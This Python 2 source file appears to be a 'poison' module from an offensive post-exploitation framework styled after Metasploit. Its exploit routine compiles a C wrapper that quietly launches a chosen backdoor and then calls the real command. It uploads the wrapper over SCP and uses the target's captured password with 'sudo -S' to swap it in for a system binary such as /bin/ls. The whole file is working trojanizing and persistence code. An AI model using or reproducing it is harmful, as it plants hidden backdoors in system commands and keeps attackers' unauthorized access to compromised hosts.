from module import *

class Poison(Module):
    prompt = Fore.RED + "(msf) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using poison module"
        self.target = target
        self.core = core
        self.options = {
                "backdoor" : Option("backdoor", "initd", "name of backdoor to run with command", True),
                "name"    : Option("name", "ls", "name of command to poison", False),
                "location" : Option("location", "/bin", "where to put poisoned files into", False)
                }
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None



    def do_set(self, args):
        args = args.split(" ")
        if len(args) == 2 and args[0] in self.options:
            self.options[args[0].lower()].value = args[1]
            print "%s => %s" % (args[0], args[1])
            print self.options
        elif len(args) != 2:
            print "Please supply a variable and an option"
            print "Usage: set LHOST 10.1.0.1"
        else:
            print BAD + "Unknown option %s", args[0]
    
    def do_show(self, args):
        if args == "options":
            self.do_help(args)
        else:
            print BAD + "Unknown option %s", args
    
    def check_valid(self):
        return True

    def do_exploit(self, args):
        backdoor = self.get_value("backdoor")
        name = self.get_value("name")
        loc = self.get_value("location")
        password = self.target.pword

        poison = open("tmp/poison.c", "w")
        poison.write("#include <stdlib.h>\nint main() {\nsystem(\"./%s 2> /dev/null &\");\nsystem(\"%s/share/%s\");\nreturn 0;\n }" % (backdoor, loc, name))
        poison.close()
        os.system("gcc tmp/poison.c -o tmp/%s" % name)
        self.target.scpFiles(self, "tmp/" + name, False)
        self.target.ssh.exec_command("echo %s | sudo -S mkdir %s/share" % (password, loc)) # sudo fix
        self.target.ssh.exec_command("echo %s | sudo -S mv %s/%s %s/share/" % (password, loc, name, loc))
        self.target.ssh.exec_command("echo %s | sudo -S mv %s %s/" % (password, name, loc))
